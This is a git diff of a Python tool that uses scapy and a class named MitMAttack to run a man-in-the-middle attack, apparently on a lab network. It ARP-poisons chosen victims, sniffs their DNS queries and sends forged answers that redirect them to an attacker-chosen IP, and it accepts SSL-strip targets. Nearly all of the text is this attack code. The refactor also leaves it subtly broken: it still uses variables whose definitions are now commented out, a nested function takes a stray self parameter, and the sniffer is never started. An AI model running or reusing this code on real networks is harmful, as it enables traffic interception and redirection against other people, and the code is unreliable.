@@ -13,17 +13,18 @@ import platform
 import threading
 import time
 
+
 # load_layer("tls")
 
-host_ip = "192.168.56.103"
-target_ip = "192.168.56.101"
-
-host_mac = '08:00:27:d0:25:4b'
-
-ip_to_spoof = '192.168.56.102'
-
-targets = [{'ip': "192.168.56.101"},
-           {'ip': '192.168.56.102'}]
+# host_ip = "192.168.56.103"
+# target_ip = "192.168.56.101"
+#
+# host_mac = '08:00:27:d0:25:4b'
+#
+# ip_to_spoof = '192.168.56.102'
+#
+# targets = [{'ip': "192.168.56.101"},
+#            {'ip': '192.168.56.102'}]
 
 
 # logging.getLogger('scapy').setLevel(logging.WARNING)
@@ -32,10 +33,11 @@ class MitMAttack:
 
     def __init__(self, args):
         # set arguments for the attack
-        self.targets = args.targets
+        self.targets = [{'ip': ip} for ip in args.targets]
         self.arp_poison = args.arp_poison
-        self.dns_spoofing_targets = args.dns_spoof
-        self.ssl_strip_targets = args.ssl_strip
+
+        self.dns_spoofing_targets = [targets[i] for i in args.dns_spoof] if args.dns_spoof else []
+        self.ssl_strip_targets = [targets[i] for i in args.ssl_strip] if args.ssl_strip else []
 
         self.host_ip = ''
         self.host_mac = ''
@@ -48,9 +50,25 @@ class MitMAttack:
         """Run the attack"""
 
         self.set_local_settings()
-        threat = self.mitm_attack(targets)
+        self.mitm_attack()
 
         print('Attack is running')
+
+    def get_local_ip(self):
+        pass
+
+    def mitm_attack(self):
+        """
+        Setup continuous arp poisoning and redirect packets between victims via this host
+        :param victims: list of ip addresses
+        :return:
+        """
+        # start arp poisoning
+        th = threading.Thread(target=self.arp_poison_targets, args=(self.targets,), kwargs={'sleep': 60})
+        th.start()
+        # arp_poison_targets(victims, sleep=60)
+        print('Started, arp poisoning')
+        self.dns_sniffer(self.targets[0])
 
     def arp_poison_targets(self, victims, sleep=0):
         """
@@ -81,83 +99,66 @@ class MitMAttack:
         """
         if 'mac' not in target.keys():
             target['mac'] = getmacbyip(target['ip'])
-        p = Ether(src=host_mac) / ARP(hwsrc=host_mac, psrc=victim['ip'], hwdst=target['mac'], pdst=target['ip'])
+        p = Ether(src=self.host_mac) / ARP(hwsrc=self.host_mac, psrc=victim['ip'], hwdst=target['mac'],
+                                           pdst=target['ip'])
         sendp(p, iface='enp0s3', verbose=False)
 
-    # test
-
-    # arp_poisoning(target_ip, ip_to_spoof)
-
-    def mitm_attack(self, victims):
-        """
-        Setup continuous arp poisoning and redirect packets between victims via this host
-        :param victims: list of ip addresses
-        :return:
-        """
-        # start arp poisoning
-        th = threading.Thread(target=self.arp_poison_targets, args=(victims,), kwargs={'sleep': 60})
-        th.start()
-        # arp_poison_targets(victims, sleep=60)
-        print('Started, arp poisoning')
-        self.dns_sniffer()
-
-        return th
-
-    def dns_sniffer(self):
+    def dns_sniffer(self, target):
         """
         This function is responsible for sniffing for DNS packets and forwarding them to the spoofer.
         :return:
         """
 
-        AsyncSniffer(filter="udp and port 53 and host " + target_ip, prn=self.dns_spoofer)
+        AsyncSniffer(filter="udp and port 53 and host " + target['ip'], prn=self.get_dsn_spoofer(target))
 
-    def dns_spoofer(self, p):
-        """
-        This function is responsible for sending spoofed DNS responses to the target with the answer as the server address provided by us.
-        :param p: the packet we received
-        :return:
-        """
-        print(type(p))
-        print(p.show())
-        if not p.haslayer(IP):
-            return
+    def get_dsn_spoofer(self, target):
+        def dns_spoofer(self, p):
+            """
+            This function is responsible for sending spoofed DNS responses to the target with the answer as the server address provided by us.
+            :param p: the packet we received
+            :return:
+            """
+            print(type(p))
+            print(p.show())
+            if not p.haslayer(IP):
+                return
 
-        if (p[IP].src == target_ip and
-                p.haslayer(DNS) and
-                p[DNS].qr == 0 and  # DNS Query
-                p[DNS].opcode == 0 and  # DNS Standard Query
-                p[DNS].ancount == 0  # Answer Count
-        ):
+            if (p[IP].src == target['ip'] and
+                    p.haslayer(DNS) and
+                    p[DNS].qr == 0 and  # DNS Query
+                    p[DNS].opcode == 0 and  # DNS Standard Query
+                    p[DNS].ancount == 0  # Answer Count
+            ):
 
-            print("Sending spoofed DNS response")
-            if p.haslayer(IPv6):
-                ip_layer = IPv6(src=p[IPv6].dst, dst=p[IPv6].src)
-            else:
-                ip_layer = IP(src=p[IP].dst, dst=p[IP].src)
+                print("Sending spoofed DNS response")
+                if p.haslayer(IPv6):
+                    ip_layer = IPv6(src=p[IPv6].dst, dst=p[IPv6].src)
+                else:
+                    ip_layer = IP(src=p[IP].dst, dst=p[IP].src)
 
-            # Create the spoofed DNS response (returning back our IP as answer instead of the endpoint)
-            dns_resp = ip_layer / \
-                       UDP(
-                           dport=p[UDP].sport,
-                           sport=53
-                       ) / \
-                       DNS(
-                           id=p[DNS].id,  # Same as query
-                           ancount=1,  # Number of answers
-                           qr=1,  # DNS Response
-                           ra=1,  # Recursion available
-                           qd=(p.getlayer(DNS)).qd,  # Query Data
-                           an=DNSRR(
-                               rrname=p[DNSQR].qname,  # Queried host name
-                               rdata=ip_to_spoof,  # IP address of queried host name
-                               ttl=10
+                # Create the spoofed DNS response (returning back our IP as answer instead of the endpoint)
+                dns_resp = ip_layer / \
+                           UDP(
+                               dport=p[UDP].sport,
+                               sport=53
+                           ) / \
+                           DNS(
+                               id=p[DNS].id,  # Same as query
+                               ancount=1,  # Number of answers
+                               qr=1,  # DNS Response
+                               ra=1,  # Recursion available
+                               qd=(p.getlayer(DNS)).qd,  # Query Data
+                               an=DNSRR(
+                                   rrname=p[DNSQR].qname,  # Queried host name
+                                   rdata=ip_to_spoof,  # IP address of queried host name
+                                   ttl=10
+                               )
                            )
-                       )
 
-            # Send the spoofed DNS response
-            print(dns_resp.show())
-            send(dns_resp, verbose=0)
-            print("Resolved DNS request for " + p[DNS].qd.qname + " by " + ip_to_spoof)
+                # Send the spoofed DNS response
+                print(dns_resp.show())
+                send(dns_resp, verbose=0)
+                print("Resolved DNS request for " + p[DNS].qd.qname + " by " + ip_to_spoof)
 
     @staticmethod
     def set_local_settings():
